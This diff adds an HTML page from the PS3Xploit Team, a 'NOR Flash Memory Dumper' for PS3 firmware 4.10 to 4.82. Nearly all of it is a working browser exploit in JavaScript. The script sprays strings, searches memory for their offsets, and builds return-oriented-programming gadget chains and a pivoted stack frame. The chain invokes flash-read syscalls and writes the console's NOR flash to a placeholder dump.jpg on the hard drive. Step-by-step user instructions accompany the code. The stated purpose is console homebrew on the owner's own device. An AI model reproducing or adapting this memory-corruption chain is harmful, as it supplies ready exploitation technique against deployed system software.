@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html>
+<script src="ps3xploit_v20.js"></script>
+<head>
+<meta charset="UTF-8">
+<title>PS3Xploit Team - PS3 NOR Flash Memory Dumper v2.0 - HDD Edition</title>
+<script>
+function initROP()
+{
+	try
+	{
+		disable_cb();
+		disable_btn();
+		clearLogEntry();
+		if(t_out!=0){clearTimeout(t_out);t_out=0;}
+		usb_fp_addr=0;
+		stack_frame_addr=0;
+		jump_2_addr=0;
+		jump_1_addr=0;
+		total_loops++;
+		var flash_id = 0x22;
+		var flash_flag = 0x01000000;
+		var flash2_flag = 0x00000004;
+		var rosdump_addr=0x8A000000;
+		var start_sector=0x0;
+		var step_sector=0x800;
+		var ss_read_size=0x200*step_sector;
+		var file_size=0x10;
+		var search_max_threshold = 70*0x100000;
+		var search_base = 0x80100000;
+		var search_size = 0x200000;
+		var temp_addr= 0x8C000000;
+		var readlen_addr=0,dev_handle_addr=0,wb_addr=0,sso_addr=0;
+		var fwrite_mode="wb";
+		usb_fp=convertString("xxxx/dev_hdd0/photo/" + y + "/" + m + "/" + d + "/" + "dump.jpg" )+unescape("\u0000")+convertString(fwrite_mode)+unescape("\u0000")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+unescape("\u4141\u4141\u4141\u4141\uFD7E");
+		function reload()
+		{
+			showResult(hr+"<h1><b>Exploit Initialization..."+br+"<font color=%22000000%22>Progress: "+((100/max_loops)*total_loops).toString()+"%, please wait...</font></b></h1>");
+			t_out=setTimeout(initROP,1000);
+		};
+		function fail()
+		{
+			total_loops=0;
+			showResult(hr+"<h1><b>Exploit Initialization FAILED!</h1><h2><font color=%22000000%22><a href=\"javascript:window.location.reload()\">Refresh this page</a> & try again...</font></b></h2>");
+			cleanGUI();
+		};
+		do
+		{
+			if(search_max_threshold<search_size){
+			if(total_loops<max_loops)reload();
+			else fail();
+			return;}
+			usb_fp=usb_fp.replaceAt(0,hexh2bin(0x7EFD));
+			usb_fp_addr=findJsVariableOffset("usb_fp",usb_fp,search_base,search_size);
+			search_max_threshold-=search_size;
+		}while(usb_fp_addr===0);
+		wb_addr=usb_fp_addr+0x26;
+		sso_addr=usb_fp_addr+0x2A;
+		readlen_addr=usb_fp_addr+0x32;
+		dev_handle_addr=usb_fp_addr+0x36;
+		function readflash(nloop)
+		{
+		var ret,iterator;
+		for(iterator=0;iterator<nloop;iterator++)
+		{
+		ret+=unescape("\uFF00\uFF00\u0000\u025A\uFF10\uFF10")+hexw2bin(readlen_addr)+hexw2bin(rosdump_addr+(iterator*step_sector*0x200))+hexw2bin(step_sector)+hexw2bin(start_sector+(iterator*step_sector))+unescape("\u0000\u0000\uFF03\uFF03")+hexw2bin(flash_id)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29")
+		+unescape("\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(dev_handle_addr)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000")+hexw2bin(gadget5_addr)+unescape("\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304")
+		+unescape("\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768")
+		+unescape("\u6970\u7172\u7374\u7576\u7778\u0000\u0000")+hexw2bin(temp_addr+(iterator*0x30))+unescape("\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000")+hexw2bin(gadget3_addr)+unescape("\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132")
+		+unescape("\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778");
+		}
+		return ret;
+		};
+		stack_frame= unescape("\u4141\u2A2F")+hexw2bin(gadget2_addr)+hexw2bin(toc_addr)+unescape("\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u0000\u0000")+hexw2bin(toc_addr)+unescape("\u5152\u5354\u5556\u5758\u5960\u6162\u6364")	//64 bytes * 23
+		+unescape("\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+		+unescape("\u2930\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(temp_addr-0x30)+unescape("\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u0000\u0000")+hexw2bin(gadget3_addr)+unescape("\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192")
+		+unescape("\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556")
+		+unescape("\u5758\u5960\u6162\u0000\u0258\uFF10\uFF10\uFF08\uFF08\uFF07\uFF07\u0000\u0000")+hexw2bin(dev_handle_addr)+unescape("\u0000\u0000\uFF03\uFF03")+hexw2bin(sso_addr)+unescape("\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\uFF29\uFF29\uFF29")
+		+unescape("\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(temp_addr-0x60)+unescape("\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u0000\u0000")+hexw2bin(gadget4_addr)+unescape("\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384")
+		+unescape("\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u8586\u8788")
+		+unescape("\u8990\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566")+hexw2bin(flash_flag)+hexw2bin(flash2_flag)+unescape("\u7576\u7778\u7980\u8182\u0000\u0000")+hexw2bin(gadget3_addr)+unescape("\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112")
+		+unescape("\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960")
+		+readflash(file_size)
+		+unescape("\u0304\u0506\u0000\u0259\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u0000\u0000\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000\uFF29\uFF29\u0000\u0000\uFF30\uFF30\u0000\u0000")+hexw2bin(dev_handle_addr)
+		+unescape("\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000")+hexw2bin(gadget5_addr)+unescape("\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324")
+		+unescape("\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u0000\u0000")+hexw2bin(temp_addr+0x500)
+		+unescape("\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0000\u0000")+hexw2bin(gadget3_addr)+unescape("\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152")
+		+unescape("\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\uFF11\uFF11\uFF10\uFF10\uFF08")
+		+unescape("\uFF08\uFF07\uFF07\uFF06\uFF06\uFF05\uFF05")+hexw2bin(wb_addr)+unescape("\uFF03\uFF03\uFF09\uFF09\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u0000\u0000")+hexw2bin(file_size*ss_read_size)+unescape("\u0000\u0000")+hexw2bin(rosdump_addr)+unescape("\u0000\u0000")+hexw2bin(usb_fp_addr)
+		+unescape("\u8384\u8586\u8788\u8990\uF10F\u9394\u9596\u9798\u0000\u0000\u0001\u3B74\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344")
+		+unescape("\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000\uFF31")
+		+unescape("\uFF31\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u0000\u0000")+hexw2bin(gadget6_addr)+unescape("\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970")
+		+unescape("\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334")
+		+unescape("\u3536\u3738\u3940\u4142\u4344\u0000\u0000")+hexw2bin(temp_addr+0x600)+unescape("\u0000\u0000\uFF30\uFF30\u0000\u0000")+hexw2bin(temp_addr+0x700)+unescape("\u0000\u0000")
+		+hexw2bin(sp_exit)+unescape("\u9900\u0102\u0304\u0506\u0000\u0000")+hexw2bin(gadget8_addr)+unescape("\u2F2A");		
+		do
+		{
+			if(search_max_threshold<search_size){
+			if(total_loops<max_loops)reload();
+			else fail();
+			return;}
+			stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));
+			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base,search_size);
+			search_max_threshold-=search_size;
+		}while(stack_frame_addr===0);
+		jump_2=unescape("\u0102\u7EFB\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950")
+		+hexw2bin(stack_frame_addr)+unescape("\uFB7E");		
+		do
+		{
+			if(search_max_threshold<search_size){
+			if(total_loops<max_loops)reload();
+			else fail();
+			return;}
+			jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));
+			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);
+			search_max_threshold-=search_size;
+		}while(jump_2_addr===0);
+		jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");
+		do
+		{
+			if(search_max_threshold<search_size){
+			if(total_loops<max_loops)reload();
+			else fail();
+			return;}
+			jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));
+			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);
+			search_max_threshold-=search_size;
+		}while(jump_1_addr===0);
+		
+		var u=checkMemory(usb_fp_addr-0x4,0x100,usb_fp.length);
+		var j2=checkMemory(jump_2_addr-0x4,0x100,jump_2.length);
+		var j1=checkMemory(jump_1_addr-0x4,0x100,jump_1.length);
+		if((j2===jump_2)&&(j1===jump_1)&&(u===usb_fp))
+		{
+			if(t_out!=0){clearTimeout(t_out);}
+			document.getElementById('step2').innerHTML="<h3><b><font color=%22386E38%22>Initialization succeeded. Proceed to Step 3..</font></b></h3>";
+			showResult(hr+"<h1><b><font color=%22386E38%22>Exploit Initialization SUCCESS...!</font></b></h1><h3><b><font color=%22000000%22>You can now proceed to dump the NOR Flash Memory to internal HDD!</font></b></h3>");
+			enable_trigger();
+		}
+		else 
+		{
+			logAdd("String mismatch in memory!");
+			if(total_loops<max_loops)reload();
+			else fail();
+		}
+	} 
+	catch(e) 
+	{
+		debug=true;
+		logAdd(br+"Exploit initialization failed because the following exception was thrown during execution:"+br+e);
+		debug=false;
+	}
+}
+
+function triggerX()
+{
+		clearLogEntry();
+		document.getElementById('step2').innerHTML="";
+		showResult(hr+"<h1><b>Proceeding to dump 16Mb NOR Flash Memory to HDD...</b></h1><h3><b><font color=%22000000%22>Please wait, the dump operation should take about 30 seconds!</font></b></h3>");
+		disable_cb();
+		disable_btn();
+		setTimeout(trigger,1000,jump_1_addr);
+		setTimeout(success,2000,hr+"<h1><b><font color=%22386E38%22>NOR Flash dump operation completed..!</font></b></h1><h3><b><font color=%22000000%22>Copy the dump.jpg file from XMB Photo Column to your USB device & rename it to dump.hex...</font></b></h3>");
+}
+</script>
+</head>
+	<body id="BodyID" bgcolor="#FFD097">
+	<div id="HeaderID" style="color:#CC2010">
+	<h1>PS3 NOR Flash Memory Dumper v2.0 - HDD Edition</h1>
+	<h4><font color="#000000">by PS3Xploit Team: </font></h2><b> W | esc0rtd3w | habib | bguerville</b></font><hr></h4>
+	<h4><font color="#000000">v2.0 Update crafted by: </font>bguerville <font color="#000000">(ROP, Javascript & Debugging) |</font> esc0rtd3w <font color="#000000">(Debugging & Testing)<hr></h4>
+	<font color="#000000">Many thanks to xerpi for the userland memory leak exploit ps3 port, zecoxao & Joonie for their early & continued support, mysis for documenting vsh exports & plugins, the psdevwiki contributors of course, STLcardsWS for his long standing contribution & all ps3 community hackers/devs past & present, you know who you are...<br>Thanks as well to littlebalup for providing the idea & the related javascript used to make this HDD edition.<hr>
+	<font color="#CC2010">
+	<h3>Supports OFW and CFW CEX Firmware versions 4.10 to 4.82<br>
+	Supports OFW and CFW DEX Firmware version 4.81<br>
+	Supports Phat Models Hxx/Jxx/Kxx/Lxx/Mxx/Pxx/Qxx<br>
+	Supports Slim Models 2xxx/3xxx<br>
+	Supports SuperSlim Models 4xxx [Excluding 4xxx-A]</h3>
+	</font>
+	Instructions/additional details & news on <a href="http://www.psx-place.com/forums/PS3Xploit">http://www.psx-place.com/forums/PS3Xploit</a><br></font>
+	<hr>
+	</div>
+	<h2><b><u>Step</u> 1:</b></h2>
+	<p><b>Download the dump.jpg picture file to your PS3 internal HDD.</b></p>
+	<h3><b><a href="dump.jpg">Press &#x25B3 here</a> then: File &#x2192 Save Target &#x2192 System Storage(Photo)</b></h3>
+	<p>The picture will serve as placeholder for the dump. It will be saved on the PS3 as : <b><span id="filePath"></span></b></p>
+	<h2><b><u>Step</u> 2:</b></h2>
+	<button id="btnROP" type="button" onclick="initROP();" autofocus>Initialize Exploit</button><span id="dex_txt" style="visibility:hidden"> DEX mode<input type="checkbox" id="dex" name="DEX" disabled="true" onclick="dex();"/></span>
+	<div id="step2" style="color:#CC2010"><h3><b>Wait for the exploit initialization to succeed...</b></h3></div>
+	<h2><b><u>Step</u> 3:</b></h2>
+	<button id="btnTrigger" disabled="true" type="button" onclick="triggerX();">Dump 16Mb NOR Flash to HDD</button>
+	<div id="result" style="color:#CC2010"></div><br>
+	<div id="log"></div>
+	<div id="exploit" ></div>
+	<div id="trigger"></div>
+	<div id="footer" style="color:#000000"></div>
+	<script type="text/javascript" >
+		n =  new Date();
+		y = n.getFullYear();
+		m = ("0" + (n.getMonth() + 1)).slice(-2);
+		d = ("0" + n.getDate()).slice(-2);
+		document.getElementById("filePath").innerHTML = "/dev_hdd0/photo/" + y + "/" + m + "/" + d + "/" + "dump.jpg";
+		writeEnvInfo();
+		ps3chk();
+	</script>
+	</body>
+</html>
